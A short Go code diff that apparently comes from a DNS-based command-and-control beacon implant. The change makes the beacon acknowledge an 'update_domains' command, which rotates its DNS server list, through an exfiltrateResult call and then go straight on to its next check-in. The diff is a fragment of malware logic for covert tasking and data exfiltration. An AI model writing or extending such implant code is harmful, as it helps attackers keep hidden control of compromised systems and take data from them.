@@ -403,8 +403,13 @@ func (b *Beacon) runBeacon() {
 			if strings.HasPrefix(command, "update_domains:") {
 				// Special system command to update DNS domain list
 				b.handleUpdateDomains(command[15:]) // Skip "update_domains:" prefix
-				// Send success acknowledgment
-				_ = b.sendResult(taskID, "domains_updated")
+
+				// Send success acknowledgment (best-effort, no retries)
+				// The new DNS servers may not recognize the task ID, which is fine
+				// We just notify completion and move on to normal check-ins
+				_ = b.exfiltrateResult("domains_updated", taskID)
+
+				// Continue to next check-in cycle immediately
 				continue
 			}
 
